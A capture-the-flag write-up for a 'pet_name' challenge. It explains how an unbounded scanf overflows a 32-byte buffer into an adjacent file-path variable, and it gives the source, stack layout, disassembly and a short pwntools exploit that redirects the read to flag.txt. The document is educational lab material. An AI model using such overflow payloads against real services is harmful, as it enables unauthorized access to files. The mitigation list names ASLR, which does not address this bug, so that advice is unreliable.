# pet_name WriteUp

## Challenge Description
This challenge involves exploiting a simple buffer overflow vulnerability to modify a file path variable and read the flag file instead of the intended pet sound file.

## Binary Analysis
```bash
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

## Source Code Analysis

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

void init() {
    setbuf(stdout, NULL);
    setbuf(stdin, NULL);
}

int main() {
    init();

    char pet_name[32] = {0};
    char path[128] = "/home/pwn/pet_sound.txt";

    printf("Your pet name?: ");
    scanf("%s", pet_name);

    FILE *fp = fopen(path, "r");
    if (fp) {
        char buf[256] = {0};
        if (fgets(buf, sizeof(buf), fp) != NULL) {
            printf("%s sound: %s\n", pet_name, buf);
        } else {
            puts("Failed to read the file.");
        }
        fclose(fp);
    } else {
        printf("File not found: %s\n", path);
    }
    return 0;
}
```

### Vulnerability Analysis
1. **Buffer Overflow**: No input length validation in `scanf("%s", pet_name)`
2. **Adjacent Variables**: The `pet_name[32]` and `path[128]` buffers are adjacent on the stack
3. **Path Injection**: Overflowing `pet_name` can overwrite the `path` variable

## Memory Layout Analysis

Through disassembly analysis, we can identify the stack layout:

```text
[rbp-0x1b0] <- pet_name[32]     (32 bytes)
[rbp-0x190] <- path[128]        (128 bytes, initialized with "/home/pwn/pet_sound.txt")
```

**Key Findings:**
- Stack offset difference: 0x20 (32 bytes)
- Perfect alignment for buffer overflow attack
- No stack canary between the buffers

### Assembly Analysis
```asm
1284:   movq   $0x0,-0x1b0(%rbp)       # pet_name initialization
128f:   movq   $0x0,-0x1a8(%rbp)       
129a:   movq   $0x0,-0x1a0(%rbp)
12a5:   movq   $0x0,-0x198(%rbp)       # pet_name[28-31]
12b0:   movabs $0x77702f656d6f682f,%rax # "/home/pw"
12c4:   mov    %rax,-0x190(%rbp)        # path[0-7]
```

## Exploitation Strategy

The attack leverages the buffer overflow to perform path injection:

1. **Fill Buffer**: Send exactly 32 bytes to fill the `pet_name` buffer
2. **Overwrite Path**: Append the target file path `/home/pwn/flag.txt`
3. **File Redirection**: The program will open and read the flag file instead

### Attack Flow
```
Input: [32 bytes padding] + ["/home/pwn/flag.txt\x00"]
              ↓
Memory: pet_name[32] → path["/home/pwn/flag.txt"]
              ↓
Result: Program reads flag.txt instead of pet_sound.txt
```

## Exploit Code

```python
from pwn import *

# Connect to the remote service
p = remote('localhost', 9080)

# Craft the payload
payload = b'a'*0x20 + b'/home/pwn/flag.txt\x00'

# Send the payload
p.sendlineafter(b': ', payload)

# Interact with the program to get the flag
p.interactive()
```

### Payload Structure
- `b'a'*0x20`: 32 bytes of padding to fill the `pet_name` buffer
- `b'/home/pwn/flag.txt\x00'`: Target file path with null terminator
- Total payload size: 32 + 18 = 50 bytes

### Exploitation Process
1. **Connection**: Establish connection to the remote service
2. **Payload Delivery**: Send the crafted payload when prompted for pet name
3. **Buffer Overflow**: The input overflows `pet_name` and overwrites `path`
4. **File Operation**: Program attempts to open the modified path
5. **Flag Retrieval**: Contents of flag.txt are displayed in the output

## Execution Flow

1. Program initializes with `path = "/home/pwn/pet_sound.txt"`
2. User input overflows `pet_name` buffer
3. Overflow data overwrites `path` with `/home/pwn/flag.txt`
4. `fopen(path, "r")` opens the flag file
5. Flag contents are read and displayed via `printf("%s sound: %s\n", pet_name, buf)`

## Mitigation

This vulnerability could be prevented by:
- Using `fgets()` or `scanf("%31s", pet_name)` for bounded input
- Adding input validation and length checks
- Using stack canaries (though present, not between these specific variables)
- Implementing Address Space Layout Randomization (ASLR)

## Flag
Executing this exploit successfully retrieves the flag from `/home/pwn/flag.txt`.